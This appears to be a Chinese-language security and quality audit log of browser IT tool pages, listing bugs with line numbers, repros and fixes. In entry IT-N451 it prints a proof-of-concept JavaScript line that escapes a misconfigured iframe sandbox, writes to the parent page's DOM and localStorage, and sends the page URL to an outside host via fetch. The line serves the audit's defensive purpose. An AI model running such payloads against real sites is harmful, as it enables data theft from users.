### IT-N445 字符串内的 `/*` 被当作块注释起点，后续整段代码被吞为注释（高，确认缺陷）
- 页面：`tools/it/code-line-counter.html`
- 问题：`isInStr()` 定义于 `:292-301` 但全文无任何调用（grep 仅定义 1 处），块注释检测直接用 `t.indexOf('/*')`（`:325`），不区分字符串/模板字符串/正则。页面 :123 却明确承诺「字符串或正则字面量中出现的 `//`、`/*` 不应被误判为注释」。
- 行号：`:292-301`（死代码）、`:321-327`（核心 `:325`）
- 复现：JS 输入 `var re = "/*";` 换行 `var a = 1;` 换行 `var b = 2;` → 实际 总行 3 / 代码 0 / 注释 3 / 空 0、代码占比 `0.0%`（`node` 复刻）；期望 代码 2、注释 0、占比 `66.7%`。
- 影响：正则、URL、模板字符串里出现 `/*` 的代码会被整段吞为注释，代码行数与占比严重失真；这是统计工具的核心输出。
- 方案：扫描时维护字符串/模板字符串/正则状态机，在字符串内跳过 `/*`、`//`。
- 假工具：否

### IT-N446 块注释结束行被重复计数，默认示例四卡片之和大于总行数（高，确认缺陷）
- 页面：`tools/it/code-line-counter.html`
- 问题：`if(inBlock)` 分支先 `comment++`（`:317`），结束块注释后在 `:328` 又按最终判定再计一次；结束行若还带代码，则注释与代码各记一次。
- 行号：`:317`、`:328`
- 复现：页面默认示例（`:148-157`）→ 实际 总行 10 / 代码 4 / 注释 6 / 空行 1（合计 11 > 总行 10，注释应为 5，`node` 复刻 `{total:10,code:4,comment:6,blank:1,sum:11}`）；再如 `/* start` / ` middle` / `*/ const a = 1;` → 注释 3、代码 1，合计 4 > 总行 3。
- 影响：打开页面第一眼的数据就自相矛盾（注释率、代码占比随之失真），用户无法判断该信哪张卡片。
- 方案：结束行只在统一收口处计一次（删掉 `if(inBlock)` 内的 `comment++`，改记状态）。
- 假工具：否

### IT-N447 行中块注释被判为整行注释，行尾 `/* */` 使代码行漏计（中，确认缺陷）
- 页面：`tools/it/code-line-counter.html`
- 问题：块注释起点只要 `indexOf('/*')>=0` 就置 `isComment`（`:325`），不检查其前面是否有代码；而行注释只在行首匹配（`:319`），两者口径不一致。
- 行号：`:319`、`:321-327`
- 复现：JS 输入 `var x = 1; /* note */` 换行 `var y = 2;` → 实际 代码 1 / 注释 1（第一行算注释）；期望 代码 2 / 注释 0（或单列"含注释的代码行"）。
- 影响：常见的行尾块注释让代码行被少计，统计口径与主流工具（cloc/tokei）不一致。
- 方案：命中 `/*` 时若其前有非空代码，计为代码行；只有整行都是注释时才计注释行。
- 假工具：否

### IT-N448 高亮按行独立 tokenize，跨行块注释/三引号字符串/HTML 注释无法识别（中，确认缺陷）
- 页面：`tools/it/code-highlighter.html`
- 问题：`renderHighlighted()` 先 `code.split('\n')`，再对每行单独调用 `tokenize(line, lang)`（`:1346-1352`）；而 tokenize 的 `/* */`（`:944-951`）、Python `"""`/`'''`（`:952-959`）、HTML `<!-- -->`（`:1102-1108`）都只在单行内找结束符，跨行必然失配。页面公式却承诺识别块注释与三引号字符串（`:312`）。
- 行号：`:1345-1361`（核心 `:1352`）、`:944-951`、`:952-959`、`:1102-1108`
- 复现：JS 输入三行 `/* a` / ` b` / `*/` → 实际第 1 行注释色、第 2 行 `b` 普通色、第 3 行 `*/` 运算符色；期望三行整体注释色。Python 多行 docstring、HTML 多行注释同症状；模板字符串跨行也会被拆成多色。
- 影响：文档注释、多行字符串是最常见输入，高亮结果错色并被"复制高亮 HTML"原样带出。
- 方案：整段 tokenize 后再按 token 内部换行拆行渲染，或携带跨行状态。
- 假工具：否

### IT-N449 「复制高亮 HTML」不带 `.hl-*` 样式，粘贴到页面外全无颜色（中，确认缺陷）
- 页面：`tools/it/code-highlighter.html`
- 问题：`copyHighlightedHTML()` 只拼容器与 `td` 的内联样式（`:1447-1451`），没有导出 `.hl-keyword/.hl-string/.hl-comment…` 的颜色规则（这些规则只存在于本页 `<style>` 的 `:166-196`），复制结果里的 `<span class="hl-…">` 在目标文档中无任何样式。
- 行号：`:1433-1455`（核心 `:1447-1451`）、`:166-196`
- 复现：输入 `const a = 1;` → 点「🎨 高亮渲染」→「📋 复制高亮 HTML」→ 把剪贴板内容存成 `.html` 打开 → 实际只有黑色等宽文本与行号，关键字/字符串/注释全无颜色；期望保留着色。
- 影响：该按钮的唯一用途就是带走带色片段，产物在页面外不可用（结构、行号、字体正常，仅颜色全部丢失）。
- 方案：复制时把 `.hl-*` 规则（含浅/深主题色）内联成 `<style>` 前缀，或为每个 span 写行内 `style="color:…"`。
- 假工具：否

### IT-N450 Emoji 数据集重复 3 个字符，计数虚高且检索出现重复卡片（中，确认缺陷）
- 页面：`tools/it/emoji-picker.html`
- 问题：`EMOJI` 数组（`:209`）里 `💡`（idea/bulb）、`✈️`（airplane/plane）、`💬`（speech/comment）各出现两次，`calcTool()` 不去重，标题直接用 `list.length`（`:212`）。
- 行号：`:209`、`:211-212`
- 复现：留空搜索 → 实际「共 195 个 emoji」，去重后 192（`node` 读页内数组：total 195 / unique 192）；搜索 `灯`、`飞机` 各返回两张同字符卡片；期望 192 且每字符一张。
- 影响：计数口径错误，检索结果重复，用户以为存在不同表情；与"内置约 180 个"（`:169`）也对不上。
- 方案：构建/加载时按字符去重（保留首个），或删除重复条目。
- 假工具：否

### IT-N451 `sandbox` 同时开 `allow-scripts` 与 `allow-same-origin`，隔离失效且可外发数据（高，安全缺陷）
- 页面：`tools/it/code-runner.html`
- 问题：iframe 声明 `sandbox="allow-scripts allow-modals allow-same-origin"`（`:494`）。按 HTML 规范，`allow-scripts` + `allow-same-origin` 会让框架保留父页同源身份、脚本可访问父文档，沙箱形同虚设（浏览器会给出"可逃逸沙箱"告警）；父子页也确实依赖同源才能 `contentDocument` + `doc.write`（`:717-761`）。页面却称「交给隔离 iframe 执行」（`:401`）、「防止访问主页面 DOM、Cookie 与同源数据」（`:405`），FAQ 称「不能访问网络/文件，沙箱隔离，仅纯计算」（`:604`）。
- 行号：`:494`（承诺 `:401`、`:405`、`:601`、`:604`、`:623-629`）
- 复现：JS 面板输入 `parent.document.body.dataset.pwned='1'; parent.localStorage.setItem('tb','x'); fetch('https://example.com/x?d='+encodeURIComponent(parent.location.href))` 后运行 → 实际父页 DOM 被改、localStorage 被写、跨域请求已出站（受 CORS 影响但请求已发出）；期望 `parent.document` 抛 `SecurityError`、无网络请求。
- 影响：任何被粘贴或分享的代码片段都能读写本站 localStorage 并外发，或改写工具页 UI；"浏览器沙箱隔离"的安全承诺不成立（当前能力等同"同页预览器"）。
- 方案：去掉 `allow-same-origin`，改用 `srcdoc`/Blob URL 注入且父页不再直接访问 `contentDocument`（控制台仍经 postMessage），并声明"非安全沙箱"直至改完。
- 假工具：否

### IT-N452 用户 JS 里的字面量 `</script>` 提前闭合内联脚本，整段代码失效（中，确认缺陷）
- 页面：`tools/it/code-runner.html`
- 问题：`doc.write(... '<script>' + js + '<\/script>' ...)`（`:759`）把用户 JS 原样嵌入内联脚本，出现字面量 `</script>` 即提前结束脚本块，后续内容被当作 HTML。
- 行号：`:759`
- 复现：JS 输入 `console.log("</script>")` 后点运行 → 实际生成 `<script>console.log("` 被截断，控制台报语法错误、剩余代码变成页面文本；期望正常打印 `</script>`。
- 影响：演示 `document.write('<script src=x></script>')` 这类 HTML 字符串是常见需求，一写整段失效，且报错指向用户代码、掩盖真实原因。
- 方案：拼接前把 `js` 中的 `</script` 替换为 `<\/script`（或用 `srcdoc` 并转义）。
- 假工具：否

### IT-N453 用户代码无超时/终止机制，`while(true)` 直接冻结整个标签页（中，承诺未实现）
- 页面：`tools/it/code-runner.html`
- 问题：`executeInIframe()` 把用户 JS 直接写进同线程 iframe（`:758-759`），没有任何超时或终止；页面深解示例写「输出 `1024`（受超时与内存限制）」（`:601`），标准表写「限制 CPU 时间与内存，防止无限循环耗尽资源」（`:629`）。
- 行号：`:717-761`（核心 `:758-759`）、`:601`、`:629`
- 复现：JS 输入 `while(true){}` 后运行 → 实际整个标签页（含本页 UI）无响应，只能强杀标签；期望超时后终止并提示。
- 影响：死循环/长任务让工具页永久卡死，用户未保存代码丢失；与页面两处"受超时限制"的说法矛盾。
- 方案：用 Worker + `terminate()` 计时，或在执行前提示"无限循环会冻结页面"并删除超时承诺。
- 假工具：否

### IT-N454 忙等测试在事件派发前就占满主线程，`stopFlag` 永远不会置位、无法中途停止（中，确认缺陷）
- 页面：`tools/it/benchmark-builder.html`
- 问题：`run()` 在 `setTimeout(…,30)` 回调里同步 `while(!stopFlag && performance.now()-start<duration)` 忙等（`:291-303`，循环在 `:295`）；`stopFlag` 只在 `stopRun()`（`:283`）里置位，而 `stopRun()` 只能由「负载类型」select 的 change（`:123`）或预设按钮回调（`:369`、`:421`）触发——主线程被 `while` 占用期间事件无法派发，`stopFlag` 恒为 false；`:293` 定义的 `guard` 也从未被调用。
- 行号：`:123`、`:283`、`:284-313`（核心 `:295`）、`:293`
- 复现：时长选 5 秒 → 点「▶ 开始测试」→ 运行中切换负载类型/点击任何按钮 → 实际页面完全无响应约 5 秒、测试跑满全程；期望能中途停止并保留已完成部分。
- 影响：「可停止」的交互是死代码，任何一次测试都会冻结 UI；页面 :156 只提示"可能短暂卡顿"，未说明无法停止。
- 方案：改用 Worker 计时与停止，或把忙等切成 `setTimeout` 分片让出主线程。
- 假工具：否

### IT-N455 「复制测试代码」只给出空循环，忽略所选负载与时长，无法复现页面结果（中，假功能）
- 页面：`tools/it/benchmark-builder.html`
- 问题：`copyCode()` 生成的是写死模板（`:315-318`）：注释里只有类型名，循环体只有 `// 在此放入被测代码` + `ops++`，时长固定 `1000`ms，完全不读取 `#type` 的负载逻辑与 `#ms` 的时长。
- 行号：`:315-318`
- 复现：选「数组操作」+「5 秒」→ 点「复制测试代码」→ 实际得到 `while(performance.now()-start<1000){ // 在此放入被测代码\n ops++; }`，只测空循环开销，与所选负载无关；期望复制包含 `push`/`sort` 的对应负载并写入 5000ms。
- 影响：这是该页唯一可带走的产物，拿到的代码测不出页面上的负载，对比结果无意义。
- 方案：按 `type` 生成对应 workload 片段，并把 `ms` 注入循环条件。
- 假工具：否

### 覆盖清单（V 批 IT 编辑器/安全/编码）
- `rich-text-editor`：IT-N437（高，安全）；IT-N438、IT-N439（中）。
- `morse-decode-advanced`：IT-N440（高，假工具）；IT-N441、IT-N442、IT-N443（中）。
- `string-obfuscator`：IT-N444（中）；无高优缺陷（全角/ROT13/Base64/`\x` 十六进制/HTML 实体主路径往返核对正确，十六进制对 emoji 按 UTF-8 字节输出无截断）。
- `code-line-counter`：IT-N445、IT-N446（高）；IT-N447（中）。
- `code-highlighter`：IT-N448、IT-N449（中）；无高优缺陷（token 渲染统一走 `esc()`，`<`/`>`/`&`/`"` 已转义，未发现注入）。
- `emoji-picker`：IT-N450（中）；无高优缺陷（字符/中文关键词/英文名过滤逻辑本身正确，复制路径无注入）。
- `code-runner`：IT-N451（高，安全）；IT-N452、IT-N453（中）。
- `benchmark-builder`：IT-N454、IT-N455（中）；无高优缺陷（五种负载的循环体与吞吐公式本身可算，评级阈值仅为经验值）。
- 方法声明：本轮逐页通读上述 8 页源码，用 `node` 在 `/tmp` 复刻页面原函数实算（`calcTool` 行数统计、`enc/dec`、`prettyHtml`、emoji 数组去重、`split('')` 反转）并给出「输入 → 实际 / 期望」；**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。IT-N437 的事件属性执行、IT-N451 的沙箱逃逸依据 HTML 规范（`innerHTML` 插入的 `onerror` 会触发；`allow-scripts` + `allow-same-origin` 不提供来源隔离）判定，未做真机复现。

## W 批 · IT URL/签名/安全（2026-11-04）

### 覆盖清单（W 批 IT URL/签名/安全）
- `url-qr`：无剩余缺陷（IT-N456 真编码器、IT-N457 纠错+尺寸双控件均已销账，第183–184批）。
- `og-meta-tag-generator`：无剩余缺陷（IT-N458 空值跳过+缺失告警已销账，第189批；`escA` 先转 `&` 再转 `"`，输出走 `textarea.value`，属性上下文不可注入）。
- `http-response-headers`：无剩余缺陷（IT-N459 删除 4 个混入的请求头 + ETag/Last-Modified 去重已销账，第190批；`COMMANDS` 65→59、分类仍 14，`renderCommands` 全部字段走 `escapeHtml`，搜索/复制路径无注入）。
- `api-sign-generator`：无剩余缺陷（IT-N460 XSS、IT-N461 真 MD5、IT-N462 预设重算均已销账，第185–187批）。
- `rc4`：无剩余缺陷（IT-N463 显式格式解析已销账，第188批；`rc4()` 与 `RC4-drop` 主路径对照已知向量 `Key`/`Plaintext` → `bbf316e8d940af0ad3` 正确，KSA/PRGA 无死循环）。
- `js-minify`：无剩余高优/中优缺陷（IT-N464 已改为轻量词法扫描，保留字符串/正则/模板串与换行，第182批销账；结果渲染走 `escH`，无注入）。
- `url-params`：无剩余高优/中优缺陷（IT-N465/IT-N466/IT-N467 均已修复，第178–179批补独立锁与真机复核后销账）。
- `short-link-generator`：无剩余高优/中优缺陷（IT-N468 已改为 hash 映射，第180批销账；输出全部经 `escapeHtml`）。
- 方法声明：本轮逐页通读上述 8 页源码，用 `node` 在 `/tmp` 复刻页面原函数（`renderQR`、`minify`、`rc4`、`parseParams`、`md5Hex`）并给出「输入 → 实际 / 期望」；MD5 对照用 `crypto.createHash('md5')`，QR 不可扫码依据"无数据位/格式信息/纠错码字"的算法结构判定；`esc()` 不转义双引号、`innerHTML` 属性注入按 HTML 序列化规则判定（文本节点只转义 `&<>`），未开真机浏览器复现 XSS。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在本审计日志追加本节。

## W 批 · IT 计算/文本（2026-11-04）

### 覆盖清单（W 批 IT 计算/文本）
- `matrix-determinant`：无高优/中优缺陷（`detRec` 与 BigInt Bareiss 精确值对照 100 组随机 2–5 阶全对；5×5 整数矩阵得 −4656 一致；Sarrus 正负号与 2×2/3×3 公式均正确）。
- `vector-magnitude`：模长/单位向量公式正确：`|(3,4)|=5`，三维方向角 `acos(vᵢ/|v|)` 正确。
- `keyword-extractor`：停用词表实测 183 中文 + 132 英文，标签/表格/图表输出均经 `ToolBox.escHtml`。
- 方法声明：逐页通读上述 8 页源码，在 `/tmp` 用 `node` 直接抽取/复刻页面原函数（页面真实 `md5()`、表达式白名单 + `new Function`、叉积夹角、`detRec` + BigInt Bareiss、页面真实 `PINYIN` 表 + `slugify()`、`tokenizeChinese`/`filterKeywords`/`deduplicateSubstrings` + 页面真实停用词表、`isPrime`/因式分解）逐一给出「输入 → 实际 / 期望」；MD5 用 `crypto.createHash('md5')` 与 `printf '中文' | md5` 双对照；`onclick` 截断用 `python3 html.parser` 验证属性拆分。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在本审计日志追加本节。

## X 批 · IT 速查/工具（2026-11-04）

> 只读审计 8 页：`tools/it/` 下 ruby-cheatsheet、pomodoro、convert-11、postgresql-cheatsheet、typescript-cheatsheet、typing-test、cpp-cheatsheet、git-commands。未开浏览器、未跑 `_build.py`/`run_gates.py`；验证脚本仅落 `/tmp`。

### 覆盖清单（X 批 IT 速查/工具）
- `git-commands`：低优备注：`git cherry-pick`（:370/:422）与 `git bisect`（:407/:424）各重复一条，使分类计数与表格总数虚增 2。
- `pomodoro`：无剩余高优/中优缺陷（IT-N480/N481 已改为时间戳计时与跳过不落账，第181批销账；模式切换、时长设置、图表/统计渲染主流程可跑）。
- `convert-11`：IT-N483（中）；其余主路径正确（`192.168.1.1 ↔ 3232235777 ↔ 11000000.00000000.00000001.00000001`，`4294967295 ↔ 255.255.255.255 ↔ 全 1` 均对齐）。
- `typescript-cheatsheet`：示例注解已全改 `//`、非空断言示例带 `<HTMLInputElement>` 泛型（IT-N485/N486，第177批）；无高优（泛型/工具类型/`keyof` 等示例经核对正确）。
- `typing-test`：IT-N482（中）；无高优（WPM/准确率公式正确，中文按字/分、英文按 5 字符/词，历史与图表取数正确）。
- `cpp-cheatsheet`：示例注解已全改 `//`（IT-N484 第176批 + IT-N486 第177批）；无其它高优（`constexpr` 阶乘、`std::optional`、模板示例经核对正确）。
- `ruby-cheatsheet`：示例注解已全改 `#`（IT-N486，第177批）；无高优（搜索/分类/复制/图表逻辑正常，块/Proc/Lambda 示例正确）。
- `postgresql-cheatsheet`：无高优/中优（`--` 在 SQL/psql 中是合法注释；`psql` 元命令、DML/DDL、JSONB、`pg_dump -Fc` 与 `pg_restore -j` 组合均与官方文档一致——`-j` 明确支持 custom 与 directory 两种格式）。
- 安全：本批 8 页未发现可利用的安全问题（唯一 HTML 拼接点是 `git-commands` 的静态 `COMMANDS` 与搜索文本匹配，不写入 `innerHTML`；`typing-test` 历史渲染的 localStorage 内容仅在同源自污染范围内，不计）。
- 方法声明：逐页通读 8 页源码；在 `/tmp` 用 `node` 抽取 `git-commands` 的 `COMMANDS` 并对 58 条内联 `onclick` 逐一 `new Function` 编译、用 `python3 html.parser` 验证属性换行保留；用 `node` 复刻 `convert-11` 的 `calc()`/`toBin32()` 逐输入实跑；用 `clang++ -std=c++20 -fsyntax-only` 编译重载示例；用 `ruby`/`ruby -c` 实跑 `--` 注解示例；用真实 `git update-ref` + `git switch` 复现远程分支错误。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在本审计日志追加本节。

## X 批 · IT 速查/编码 II（2026-11-04）

### 覆盖清单（X 批 IT 速查/编码 II）
- `json-path`：IT-N488（高，安全）、IT-N489（高，死循环）、IT-N490（高，安全）；无其它高优（预设、递归/通配符/`length()` 主路径正确）。
- `barcode-codabar`：IT-N491（高，编码表）、IT-N492（中）、IT-N493（中）；其余绘制/导出 PNG 主流程可跑。
- `charset-detector`：IT-N494（高，假工具）、IT-N495（高，安全）；无其它高优。
- `php-cheatsheet`：IT-N496（中）；PDO/Composer/trait/命名空间示例均存在，其余命令与语法经核对正确。
- `kubernetes-cheatsheet`：IT-N497（中）；32 条命令的 `kubectl get/apply/scale/rollout/logs/exec/cp` 与 YAML 示例（selector、port、pathType）经核对正确。
- `linux-cheatsheet`：IT-N498、IT-N499、IT-N500（中）；114 条命令主体正确，搜索/分类/复制/图表渲染无注入（数据为静态，渲染前统一 `escapeHtml`）。
- `vim-cheatsheet`：IT-N501（中）；模式/移动/替换/窗口/寄存器示例经核对正确。
- `nickname-generator`：IT-N502、IT-N503、IT-N504（中）；无高优（生成主流程可跑，输出经 `escapeHtml`）。
- 安全：本批 3 条——`json-path` 的 `eval()`（IT-N488）与高亮 `innerHTML`（IT-N490）、`charset-detector` 的 `innerHTML`（IT-N495），均为「用户输入未转义/未隔离」型 DOM 注入，属自触发（无持久化、无跨用户传播路径），但都是真实可控代码执行点，建议按高优修。`barcode-codabar` 的输入只进 `canvas` 与 `textContent`，无注入。
- 假工具：1 个（`charset-detector`，IT-N494）：名为「编码识别器」，实际只做 6 条固定串替换，文档宣称的 GBK 十六进制识别完全不存在。
- 方法声明：逐页通读 8 页源码（含 `_build.py` 注入的图表/表格脚本）；在 `/tmp` 用 `node` 复刻 `json-path` 的 `parseTokens` 与切片循环（带步数上限判定死循环）、`parseInt('5:2')` 验证步长失效；用 `node` 遍历 `CODABAR` 表统计元素数与宽元素数，并对照 Wikipedia Codabar 结构（基础 12 符 1 宽条 + 1 宽空、起止符 1 宽条 + 2 宽空）逐字符核验；用 `hexdump` 确认 `RULES` 第二条正则两个分支均为同一 U+FFFD 字符；逐条比对 `--` 注解在 bash / PHP / kubectl / Vim 的语义。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做 git 写操作**；未修改任何工具页、代码或构建产物，新增脚本仅落在 `/tmp`，仅在本审计日志追加本节。

## Y 批 · IT 转换/速查（2026-11-04）

- `ascii-tree-generator`：中 2 —— 文件/目录标记冲突会静默丢子树；公式框承诺的「缩进文本推断层级」未实现。
- `barcode-code39`：高 1、中 2 —— 编码表元素数与宽元素数均不符，产出非法 Code 39；Mod 43 校验位与不支持字符处理均与承诺不符。
- `barcode-msi`：中 3 —— 校验位控件缺失、非数字静默剥离、公式框与 `buildMSI` 实现不符。
- `camera-recorder`：中 2 —— 承诺「分辨率选择」无控件；录制中点「关闭摄像头」会触发自动下载。
- `csharp-cheatsheet`：中 1 —— 示例 6 处 `-- 注释` 在 C# 中非法，复制后编译报错。
- `docker-cheatsheet`：中 2 —— 3 处命令尾 `-- 注解` 破坏命令；`docker build` 语法字段写错。
- `emacs-cheatsheet`：中 2 —— 启动命令的 `-- 注解` 被当文件名；撤销条目把 `C-/` 标成「重做」。
- `email-qr`：高 1 —— 二维码为伪随机噪点，无任何 QR 编码/纠错，扫码无效（假工具）。

| 页面 | 问题（含 tools/it/<slug>.html:NN） | 编号 |
|---|---|---|

**统计**
- 页数：8（`ascii-tree-generator`、`barcode-code39`、`barcode-msi`、`camera-recorder`、`csharp-cheatsheet`、`docker-cheatsheet`、`emacs-cheatsheet`、`email-qr`）。
- 问题：16 条——高 2（IT-N507、IT-N520）/ 中 14。
- 编号区间：IT-N505–IT-N520，连续且无重号、无跳号（与已转修复清单无重叠）。
- 假工具：1 个（`tools/it/email-qr.html`，IT-N520）。
- 安全条目：0 条——8 页均未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；用户输入均经 `escapeHtml` 或仅写入 `textarea.value`/`canvas`，未发现可控 DOM 注入点。
- 方法：逐页通读 HTML 与全部内联 JS；用 node 复刻 `ascii-tree-generator` 的 `build()` 验证子树丢失、统计 `barcode-code39` 表每字符元素数/宽元素数与生成模块数；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## Y 批 · IT 速查/生成（2026-11-04）

**逐页结论（8 页，均通读 HTML 与全部内联 JS）**
- `tools/it/emoji-cheatsheet.html`：搜索、分类、柱状图均实时遍历 `EMOJIS` 生成，确属数据驱动；但数据表有 8 组重复 emoji，统计按条目重复计数。
- `tools/it/java-cheatsheet.html`：搜索、分类、图表均遍历 `COMMANDS` 生成，可用；4 处示例用了 Java 非法的 `--` 注释。
- `tools/it/kubernetes-yaml-generator.html`：Deployment + Service 模板缩进与嵌套合法；端口、名称、镜像未做合法性校验，非法输入原样拼入 YAML。
- `tools/it/location-qr.html`：**伪二维码**——不编码 geo 载荷，只画三个定位角、定时线与哈希噪点，扫码不可能得到坐标。
- `tools/it/lorem.html`：words/sentences/paragraphs 三种主流程可用；词数边界、预设/历史回调、中文占位承诺三处有缺陷。
- `tools/it/markdown-lint.html`：标题跳级/重复标题/列表缺空格/空链接 4 条规则真实现；承诺的行尾空格、代码块语言未实现，且行首强调符号会误报。
- `tools/it/nato-alphabet.html`：26 字母映射覆盖完整，正/反向均可跑；`X-ray` 反查失败、字母计数不准。
- `tools/it/nginx-cheatsheet.html`：搜索、分类、柱状图/明细表均遍历 `COMMANDS` 生成，可用；配置示例含非法 `--` 注释与永不成立的 `$https` 判断。

| 页面 | 问题（含 tools/it/<slug>.html:NN） | 编号 |
| --- | --- | --- |

**统计**
- 页数：8（`emoji-cheatsheet`、`java-cheatsheet`、`kubernetes-yaml-generator`、`location-qr`、`lorem`、`markdown-lint`、`nato-alphabet`、`nginx-cheatsheet`）。
- 问题：15 条——高 1（IT-N521）/ 中 14（IT-N522–IT-N535）。
- 编号区间：IT-N521–IT-N535，连续且无重号、无跳号（与已转修复清单无重叠）。
- 假工具：1 个（`tools/it/location-qr.html`，IT-N521，伪二维码噪点）。
- 安全条目：0 条——8 页均未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；用户输入均经 `escapeHtml`/`escH` 或仅写入 `textarea.value`/`canvas`，未发现可控 DOM 注入点。
- 方法：逐页通读 HTML 与全部内联 JS；用 node 复刻 `markdown-lint` 的 `calcTool()`、`lorem` 的 words 分支与 `nato-alphabet` 的反查/计数，确认误报与边界；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## Z 批 · IT 校验/速查（2026-11-04）

**逐页结论（8 页，均通读 HTML 与全部内联 JS）**
- `password-strength`：IT-N536 三档破解速率标签与除数已在 HEAD 修正（注释「标签与除数必须一致」；熵52 实测在线1个月/GPU 12小时/超算1小时），IT-N537 熵判读按 <40/<60/<120 单列显示且与 6 项清单等级并存，IT-N538 弱点提示在位；第214批真机 20/20 补证据销账，缺陷态注入（改错除数/阈值/去掉片段检查）18/20 与 19/20。本批未改源码。
- `tools/it/python-cheatsheet.html`：搜索、分类、柱状图与明细表均遍历 `COMMANDS` 生成，可用；15 条示例用 Python 非法的 `--` 注释，复制即语法错误。
- `tools/it/redis-cheatsheet.html`：常用命令、数据结构、事务、Stream、Lua 条目覆盖完整；4 条示例的 `-- 注解` 会被 redis-cli 当作参数，复制执行报错。
- `tools/it/rust-cheatsheet.html`：条目筛选、分类统计正常；5 条示例用 `--` 注释、2 条用 `...` 占位，且部分片段缺少上下文，复制不可编译。
- `tools/it/screen-size.html`：PPI、物理宽高、长宽比与点距计算正确；公式框声明的「屏幕面积」从未计算输出。
- `tools/it/summary-generator.html`：分句、词频、长度/位置/关键词权重与压缩率均已实现；长文本下 5% 句频阈值可把关键词全部滤掉，导致权重全 0、摘要退化为前 N 句。
- `tools/it/svg-placeholder-generator.html`：宽高钳制、字号、SVG 转义、复制与下载可用；历史记录回填后调用的是 `downloadSvg()` 而非 `render()`，结果区不重算还会触发下载。
- `tools/it/team-name-generator.html`：词库随机组合真实可用、输出经 `escapeHtml`；页面只有「领域」与「数量」，meta/公式/FAQ 承诺的风格、长度、数字后缀与语言切换均无对应控件。

| 页面 | 问题（含 tools/it/<slug>.html:NN） | 编号 |
|---|---|---|

**统计**
- 页数：8（`password-strength`、`python-cheatsheet`、`redis-cheatsheet`、`rust-cheatsheet`、`screen-size`、`summary-generator`、`svg-placeholder-generator`、`team-name-generator`）。
- 问题：14 条——高 1（IT-N536）/ 中 13（IT-N537–IT-N549）。
- 编号区间：IT-N536–IT-N549，连续且无重号、无跳号（与已转修复清单无重叠）。
- 假工具：0 个（无整页伪工具；IT-N545、IT-N549 为承诺未实现，已计入中）。
- 安全条目：0 条——8 页均未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；`password-strength.html:542` 的 localStorage 持久化选择器显式排除 `input[type=password]`，密码未落盘；其余用户输入均经 `escapeHtml`/`escH` 或仅写入 `textContent`/`value`，未发现可控 DOM 注入点。
- 方法：逐页通读 HTML 与全部内联 JS；node 复刻 `password-strength` 的熵/破解时间换算（确认标签倍率偏差）与 `summary-generator` 的 5% 句频过滤（60 句唯一文本过滤后 0 关键词、60 句权重全 0）；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## Z 批 · IT 编码/速查（二）（2026-11-04）

逐页结论（5 页）：

- `tools/it/text-qr.html`：2 条（IT-N550 高、IT-N551 中）。页面能画出定位图形，但数据区是伪随机噪声，text 只当种子，不是二维码编码；承诺的尺寸/容错/配色与 PNG/SVG 下载均无控件。
- `tools/it/tmux-cheatsheet.html`：2 条（IT-N552、IT-N553 中）。39 条速查与搜索/分类/图表均可用；问题在示例与参数说明的可复制性。
- `unicode-lookup`：IT-N554 码点/名称检索、IT-N555 内置 1342 条标准名称表、IT-N556 复制按钮走 `data-code` 均由其他 Agent 修好且在 HEAD，清单漏销账，第212批补真机证据销账：U+2603/0x1F600 各出 1 张卡、`snowman` 名称命中、1342 条名称表、表外 CJK 推导与未收录标注、引号/emoji 按字符本体复制；缺陷态注入对照 4/14（10 项红）。本批未改源码。
- `tools/it/username-generator.html`：1 条（IT-N557 中）。词根随机组合、数字/下划线/Leet/前缀与长度截断可运行，输出经 `escapeHtml`；「风格」承诺无对应控件。
- `tools/it/xxtea.html`：2 条（IT-N558 高、IT-N559 中）。加解密算法本体正确（node 复刻 1–255 字节逐长度往返一致）；缺陷在长度字只取低 8 位导致长文本解密截断，以及超长密钥静默丢弃。

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|

**统计**
- 页数：5（`text-qr`、`tmux-cheatsheet`、`unicode-lookup`、`username-generator`、`xxtea`）。
- 问题：10 条——高 2（IT-N550、IT-N558）/ 中 8（IT-N551–IT-N557、IT-N559）。
- 编号区间：IT-N550–IT-N559，连续且无重号、无跳号（与上批 IT-N536–IT-N549 衔接）。
- 假工具：0 个（无整页空壳；text-qr 有真实 UI 与历史模板，但核心渲染为伪生成，已计高）。
- 安全条目：0 条——本批页面未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/可控 DOM 注入点（`text-qr` 的文本经 `escapeHtml`，`tmux` 全字段经 `escapeHtml`，`unicode-lookup` 注入的 name 取自硬编码表）；`xxtea` 密钥与明文仅存内存，未落 localStorage。全站公共模板的 `ttzz`（bytegoofy）第三方脚本非本批页面特有，未计入。
- 方法：逐页通读 HTML 与全部内联 JS；`node -e` 内存复刻 `xxtea` 的 `longToBytes`/`bytesToLong`/加解密（未落盘、未建文件），逐长度核对往返与密钥前缀碰撞；`text-qr` 伪编码按源码判定（无分段/纠错/格式信息/掩码）；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## AA 批 · IT 深度复扫：QR/条码同族实现矩阵（2026-11-04）

> 范围：`tools/it/` 下 10 页（QR 族 5 + 一维条码族 5）。只读源码 + `node -e` 内存复算（比对 EAN G 表、Code39 元素数、Code128 符号表、`unescape` 行为），未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改 `tools/**`/js/css/json 或构建产物。伪实现 3 页沿用既有编号（IT-N520/N521/N550），本批不重复开单；新问题从 IT-D01 起。

### 同族实现矩阵

| 页面 | 真实编码 | 伪实现 | 校验位 | 纠错 | 可扫码 | 结论 / 编号 |
|---|---|---|---|---|---|---|
